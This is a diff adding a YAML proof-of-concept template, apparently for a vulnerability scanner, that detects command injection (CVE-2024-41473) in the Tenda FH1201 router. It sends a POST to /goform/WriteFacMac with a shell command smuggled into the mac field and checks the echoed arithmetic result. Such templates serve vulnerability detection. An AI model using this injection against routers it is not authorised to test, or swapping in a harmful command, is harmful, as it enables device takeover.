@@ -1,0 +1,22 @@
+id: poc-yaml-tendacn-mac-rce
+info:
+  name: Tenda-FH1201 命令注入漏洞(CVE-2024-41473)
+  severity: critical
+  tags:
+  - 命令注入
+  - CVE-2024-41473
+  finger: fh1201_firmware
+  fofa: null
+variables:
+  t1: random_int(1000,999000)
+  t2: random_int(100,1000)
+  t3: t1 - t2
+requests:
+- method: POST
+  path: /goform/WriteFacMac
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: mac=%3Becho+%22vulnerable%60expr+{{.t1}}+-+{{.t2}}%60%22
+  expression: "status_code == 200 && \ncontains(body,\"vulnerable\") &&\ncontains(body,t3)\
+    \ && !contains(body,\"<\")\n"
+transport: http
